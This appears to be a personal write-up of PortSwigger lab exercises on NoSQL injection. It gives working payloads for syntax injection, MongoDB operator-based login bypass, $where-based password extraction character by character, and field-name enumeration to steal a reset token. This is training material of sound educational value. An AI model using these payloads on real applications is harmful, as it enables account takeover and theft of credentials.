# NoSQL Injection

- https://portswigger.net/web-security/nosql-injection

## Detecting NoSQL injection

Injecting `Lifestyle'}{()"` into filter category query param results in 500 response status and mongo syntax error.

In order to detect which character breaks the server, we can submit them one by one. After submitting `Lifestyle'` we see server error and upon submiting different character we do not, so we can assume that `'`  is causing the problems.

Now injecting `Lifestyle'&&false&&'x` responds with 200 status and 0 results (3567 Content length), but injecting `Lifestyle'&&true&&'x` results in 200 status and multiple results (4732 Content length). This basically proves that we are able to successfully modify NoSQL query and perform `syntax injection`.

Injecting `Lifestyle'||true||'x` solves the lab.

## Exploiting NoSQL operator injection to bypass authentication

In order to login to the app `POST /login` request is made with `username` and `password` as json keys.

Changing the query to have logic operators as hown below still successfully logs us in.

```
{"username":{"$eq": "wiener"},"password":{"$eq":"peter"}}
```

Changing the logic operators to some not existing once in one or both keys, makes the server respond with 500 status with no detailed error message.

In order to login as admin and solve the lab we can modify the query like this:

```
{"username":{"$regex": "admin.*"},"password":{"$ne":""}}
```

## Exploiting NoSQL injection to extract data

`POST /user/lookup?user=<username>` performs user role lookup and allows checking roles for other users as well.

After requesting non existant user we receive information that no user was found, but when injecting `'` after the `user` param value we receive an error. This indicates that we might we changin the syntax of the request.

Performing requests with different logical values respond with different values: 
 - `administrator'&&true||'` -- respond with admin values
 - `administrator'&&false||'` -- could not find a user

This proves that this is vulnerable to NoSQLi.

If the search is made via `$where` clause, we can make small code execution here. For example trying to access user password via `this.password`

Performing tests to prove my theory I have tried to test for the first letter of the password via Burp Intruder:

```
administrator'&&this.password[0]=='<letter>'||'
```

On failures I have received `"Could not fina a user"` response, but on success for one letter admin role details were returned.

Run script to solve the lab:

```
python exfil-password.py 
```

## Exploiting NoSQL operator injection to extract unknown fields

Firstly during testing I have triggered the password reset for carlos.

At `POST /login` request adding `$where` caluse results in 500 response error, so we can assume there maybe inproper handling of the input from user

```
{"username":"carlos","password":"password",
"$where":1}
```

But injecting operators as shown below with objects did the trick:

```
{"username":"carlos","password":{"$ne": ""}}

{"username":"carlos","password":{"$regex": ".*"}}
```

We can now see a message `Account locked`.

Now adding `$where` clause and changing its value from `0` to `1` we receive different respond each time. For `1` - account locked, for `0` - invalid credentials.

```
{"username":"carlos","password":{"$ne": ""},"$where":"0"}

{"username":"carlos","password":{"$ne": ""},"$where":"1"}
```

Now using a `Object.keys` we can enumarate object field names and using `match` test them by regex:

```
{"username":"carlos","password":{"$ne": ""},"$where":"Object.keys(this)[0].match('^.+$')"}
```

In order to retrieve field names and then reset token value uncomment proper function calls in the script and run:

```
python exfil-forgot-token.py
```

`unlockToken` is a field value, so we can try to pass it as param to `/forgot-password` endpoint. Accessing `/forgot-password?unlockToken=a` responds with `"Invalid token"`, so now we can inject a proper one and solve the lab.
